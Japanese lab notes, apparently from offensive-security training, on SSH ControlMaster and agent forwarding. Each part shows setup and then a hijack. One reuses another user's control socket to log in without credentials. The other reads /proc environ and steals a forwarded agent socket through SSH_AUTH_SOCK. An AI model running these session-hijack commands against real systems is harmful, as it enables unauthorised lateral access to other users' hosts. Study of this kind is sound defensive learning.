# ControlMaster
ControlMasterは、単一のネットワーク接続上で複数のSSHセッションを共有できるようにする機能で、ユーザーのローカルSSH設定ファイル（**~/.ssh/config**）を編集することで有効にすることが可能

### 設定
ssh用のControlMaster設定エントリを`~/.ssh/config`として作成
```
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```

設定ファイルへのアクセス権限
```
chmod 644 ~/.ssh/config
```

ディレクトリ作成
```
mkdir ~/.ssh/controlmaster/
```

ssh接続がされた場合`~/.ssh/controlmaster/`上にソケットファイルが作成される
ソケットファイルを利用してSSH接続(パスワードや鍵なしでは入れる）
```
ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
```


# SSHエージェント転送
SSH-Agentは、ユーザーの秘密鍵を管理し、接続のたびにパスフレーズを繰り返すことなく使用できるようにするユーティリティ

### 通常利用
中間と宛先サーバにssh-copy-idで公開鍵をコピー
```
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
```

kaliの`~/.ssh/config`にエージェント転送許可設定
```
ForwardAgent yes
```

中間サーバ側は`/etc/ssh/sshd_config`に設転許可送定
```
AllowAgentForwarding yes
```

kaliはデフォルトでssh-agentが起動されてないため
```
eval `ssh-agent`
```

ssh-addでエージェントに秘密鍵を追加
```
ssh-add /path/to/key
```

### ハイジャック
SSH接続のプロセス列挙
```
ps aux | grep ssh
```

接続してるユーザ名でpstree
```
pstree -p offsec | grep ssh
```

例えば以下のように表示される
```sh
root@controller:~# pstree -p offsec | grep ssh
sshd(15228)---bash(15229)---su(15241)---bash(15242)
sshd(16380)---bash(16381)
```

エージェントを利用してると思われるPIDの環境ファイルを見る
```
cat /proc/16381/environ
```

利用してるSSH_AUTH_SOCKのソケットファイルをハイジャックしてssh接続
```
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
```